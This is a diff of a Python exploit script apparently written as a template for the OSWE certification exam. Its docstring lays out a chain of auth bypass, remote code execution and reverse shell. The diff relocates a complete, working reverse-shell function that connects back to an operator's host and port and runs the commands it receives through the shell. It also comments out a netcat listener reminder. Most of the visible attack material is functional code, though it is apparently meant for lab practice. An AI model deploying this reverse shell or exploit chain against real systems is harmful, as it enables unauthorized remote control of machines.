@@ -1,5 +1,14 @@
 #!/usr/bin/env python3
 
+"""
+OSWE Skeleton
+You will need to set up yur webserver and your reverse shell
+
+Step 1) Auth bypass
+Step 2) RCE
+Step 3) Reverse shell
+"""
+
 import sys
 import requests
 import argparse
@@ -65,6 +74,60 @@ class log():
     def debug(text):
         if args.debug:
             print(f"{GREY}[{log._ts()}] [DEBUG] {GREY}{text}{NC}")
+
+# ─── Reverse shell handler ───────────────────────────────────────────────────────────────
+def reverse_shell_handler(lhost, lport):
+    while True:
+        try:
+            # Create socket and connect
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((lhost, lport))
+            log.success(f"[listener] Connected to: {lhost}:{lport}")
+            
+            # Send shell
+            while True:
+                try:
+                    # Receive command
+                    command = s.recv(1024).decode().strip()
+                    log.debug(f"[listener] Command received: {command}")
+                    if not command or command.lower() == 'exit':
+                        break
+                    
+                    # Execute command and send output
+                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                    log.debug(f"[listener] Command output: {output}")
+                    s.send(output)
+                    
+                except subprocess.CalledProcessError as e:
+                    s.send(f"Error: {str(e)}\n".encode())
+                except:
+                    break
+                    
+        except ConnectionRefusedError:
+            log.failure("[listener] Connection refused, retrying...")
+        except socket.gaierror:
+            log.failure("[listener] Host not found, retrying...")
+        except Exception as e:
+            log.failure(f"[listener] Error: {e}")
+        finally:
+            try:
+                s.close()
+            except:
+                pass
+        
+        # Wait before retrying
+        time.sleep(5)
+        log.info("[listener] Reconnecting...")
+
+# ─── Start shell thread handler ────────────────────────────────────────────────────────
+def start_shell(lhost, lport):
+    """Start reverse shell in a background thread."""
+    thread = threading.Thread(target=reverse_shell_handler, args=(lhost, lport))
+    thread.daemon = True
+    thread.start()
+    return thread
+
+#### Main Functions ####
 
 # ─── Step 1: Auth Bypass ──────────────────────────────────────────────────────
 def auth_bypass(session, target):
@@ -135,55 +198,6 @@ def reverse_shell(session, cookies, target, lhost, lport):
     log.failure("[step 3] Reverse Shell failed")
     sys.exit(1)
 
-def reverse_shell_handler(lhost, lport):
-    while True:
-        try:
-            # Create socket and connect
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((lhost, lport))
-            log.success(f"[listener] Connected to: {lhost}:{lport}")
-            
-            # Send shell
-            while True:
-                try:
-                    # Receive command
-                    command = s.recv(1024).decode().strip()
-                    log.debug(f"[listener] Command received: {command}")
-                    if not command or command.lower() == 'exit':
-                        break
-                    
-                    # Execute command and send output
-                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-                    log.debug(f"[listener] Command output: {output}")
-                    s.send(output)
-                    
-                except subprocess.CalledProcessError as e:
-                    s.send(f"Error: {str(e)}\n".encode())
-                except:
-                    break
-                    
-        except ConnectionRefusedError:
-            log.failure("[listener] Connection refused, retrying...")
-        except socket.gaierror:
-            log.failure("[listener] Host not found, retrying...")
-        except Exception as e:
-            log.failure(f"[listener] Error: {e}")
-        finally:
-            try:
-                s.close()
-            except:
-                pass
-        
-        # Wait before retrying
-        time.sleep(5)
-        log.info("[listener] Reconnecting...")
-
-def start_shell(lhost, lport):
-    """Start reverse shell in a background thread."""
-    thread = threading.Thread(target=reverse_shell_handler, args=(lhost, lport))
-    thread.daemon = True
-    thread.start()
-    return thread
     
 # ─── Main ─────────────────────────────────────────────────────────────────────
 def main():
@@ -193,7 +207,7 @@ def main():
 
     log.info(f"Target: {target}")
     log.info(f"LHOST: {args.lhost}:{args.lport}")
-    log.info(f"Proxy: {args.proxy or 'None'}")
+    log.info(f"Proxy: {session.proxies if args.proxy else 'None'}")
     print("───────────────────────────────────────────────────────────────────────")
 
     # Step 1 — Auth bypass (populates session cookies)
@@ -203,10 +217,10 @@ def main():
     rce(session, cookies, target, "whoami")
 
     # Start listener in background
-    thread = start_shell(args.lhost, args.lport)
-    log.info(f"[step 3] Listener started in the background - ID {thread.ident}")
-    log.info(f"{YELLOW}Remember to set up your listener: nc -lvnp {args.lport}{NC}")
-    thread.join()  # Keep main thread alive
+    #thread = start_shell(args.lhost, args.lport)
+    #log.info(f"[step 3] Listener started in the background - ID {thread.ident}")
+    #log.info(f"{YELLOW}Remember to set up your listener: nc -lvnp {args.lport}{NC}")
+    #thread.join()  # Keep main thread alive
 
     # Step 3 — Pop shell
     reverse_shell(session, cookies, target, args.lhost, args.lport)
